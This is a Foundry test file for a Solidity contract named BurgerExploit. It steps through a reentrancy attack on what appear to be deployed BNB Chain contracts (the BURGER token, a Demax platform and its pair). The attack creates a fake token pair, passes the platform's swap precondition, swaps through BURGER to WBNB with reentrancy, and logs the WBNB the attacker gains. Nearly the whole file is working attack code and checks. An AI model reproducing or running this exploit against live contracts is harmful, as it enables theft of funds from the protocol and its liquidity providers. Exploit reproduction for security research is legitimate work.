// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    BurgerExploit exploit;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        vm.startPrank(attacker);
        exploit = new BurgerExploit();
        vm.stopPrank();
    }

    function test_step1_setup() public {
        vm.prank(attacker);
        exploit.step1_setup{value: 50 ether}();

        uint256 wbnbBal = IWBNB(WBNB).balanceOf(address(exploit));
        assertEq(wbnbBal, 50 ether);
        assertTrue(address(exploit.fakeToken()) != address(0));
    }

    function test_step2_buyBurger() public {
        vm.startPrank(attacker);
        exploit.step1_setup{value: 50 ether}();

        // Check BURGER/WBNB reserves first
        address pair = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;
        (uint112 r0, uint112 r1,) = IDemaxPair(pair).getReserves();
        emit log_named_uint("BURGER reserve", r0);
        emit log_named_uint("WBNB reserve", r1);

        // Buy BURGER with 10 WBNB
        exploit.step2_buyBurger(10 ether);

        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER bought", burgerBal);
        assertTrue(burgerBal > 0, "Should have BURGER");
        vm.stopPrank();
    }

    function test_step3_createPair() public {
        vm.startPrank(attacker);
        exploit.step1_setup{value: 50 ether}();
        exploit.step2_buyBurger(10 ether);

        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER balance", burgerBal);

        // Use small amounts for the fake pair
        uint256 fakeAmount = 1000 ether; // 1000 fake tokens
        uint256 burgerForPair = burgerBal / 10; // 10% of BURGER

        exploit.step3_createPair(fakeAmount, burgerForPair);
        emit log("Pair created successfully");

        // Check swapPrecondition for fake token
        address fakeAddr = address(exploit.fakeToken());
        bool precondition = IDemaxPlatform(PLATFORM).swapPrecondition(fakeAddr);
        emit log_named_string("swapPrecondition(fakeToken)", precondition ? "true" : "false");

        vm.stopPrank();
    }

    function test_fullAttack() public {
        vm.startPrank(attacker);

        // Setup
        exploit.step1_setup{value: 50 ether}();

        // Buy BURGER with 10 WBNB
        exploit.step2_buyBurger(10 ether);
        uint256 burgerBal = IERC20(BURGER).balanceOf(address(exploit));
        emit log_named_uint("BURGER bought", burgerBal);

        // Create fake pair with small amounts
        uint256 fakeAmount = 100 ether;
        uint256 burgerForPair = burgerBal / 100; // 1% of BURGER
        exploit.step3_createPair(fakeAmount, burgerForPair);
        emit log("Pair created");

        // Check precondition
        address fakeAddr = address(exploit.fakeToken());
        bool precondition = IDemaxPlatform(PLATFORM).swapPrecondition(fakeAddr);
        emit log_named_string("swapPrecondition(fakeToken)", precondition ? "true" : "false");

        if (!precondition) {
            emit log("swapPrecondition FAILED - attack won't work");
            return;
        }

        // Record initial balances
        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB before attack", wbnbBefore);

        // Attack: swap fake -> BURGER -> WBNB with reentrancy
        exploit.step4_attack(10 ether); // Use 10 fake tokens

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(exploit));
        emit log_named_uint("WBNB after attack", wbnbAfter);
        emit log_named_uint("WBNB gained", wbnbAfter - wbnbBefore);

        // Unwrap
        exploit.step5_unwrap();
        uint256 finalBalance = attacker.balance;
        emit log_named_uint("Final attacker BNB", finalBalance);

        vm.stopPrank();
    }
}
